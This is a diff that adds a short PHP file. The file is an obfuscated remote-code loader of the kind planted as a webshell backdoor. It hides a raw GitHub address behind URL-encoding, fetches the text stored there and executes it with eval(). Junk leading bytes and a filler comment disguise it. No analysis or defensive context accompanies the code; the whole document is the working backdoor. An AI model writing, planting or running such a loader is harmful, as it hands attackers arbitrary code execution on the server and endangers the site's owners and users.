@@ -1,0 +1,9 @@
+A01<?pHp
+/* AAAAAAAAAAAAAAAAAAA */
+@clearstatcache();
+$XNlsK47az0 = fopen(urldecode('%68%74%74%70%73%3a%2f%2f%72%61%77%2e%67%69%74%68%75%62%75%73%65%72%63%6f%6e%74%65%6e%74%2e%63%6f%6d%2f%70%65%72%6d%34%6e%33%6e%74%6c%79%52%6d%78%31%39%2f%6a%61%6a%61%6e%6e%65%69%6c%6c%61%6c%6f%76%65%79%6f%75%2f%6d%61%69%6e%2f%34%30%33%74%73%74%6f%72%69%2e%74%78%74'), 'r');
+$DdJHaBoYl6 = stream_get_contents($XNlsK47az0);
+fclose($XNlsK47az0);
+eval(urldecode('%3f%3e').$DdJHaBoYl6);
+
+?>
